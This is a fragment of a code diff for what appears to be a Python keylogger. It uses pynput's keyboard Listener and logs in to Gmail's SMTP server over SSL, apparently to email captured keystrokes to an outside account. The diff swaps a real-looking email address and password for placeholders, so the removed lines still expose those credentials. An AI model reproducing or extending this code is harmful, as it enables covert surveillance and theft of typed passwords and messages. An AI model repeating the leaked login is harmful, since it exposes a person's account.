@@ -13,19 +13,18 @@ with Listener(on_press=on_press) as Listener:
     Listener.join()
 
 
+    
+                                                            #or
 
 """
-
-                                           use above or use this.
-                                           
 
 import getpass
 import smtplib
 from pynput.keyboard import Key,Listener
 
 # set up an email
-email = "mharshrushi93@gmail.com"
-password = "Vampire@3"
+email = "xyz"
+password = "xyz"
 server = smtplib.SMTP_SSL('smtp.gmail.com',465)
 server.login(email,password)
 
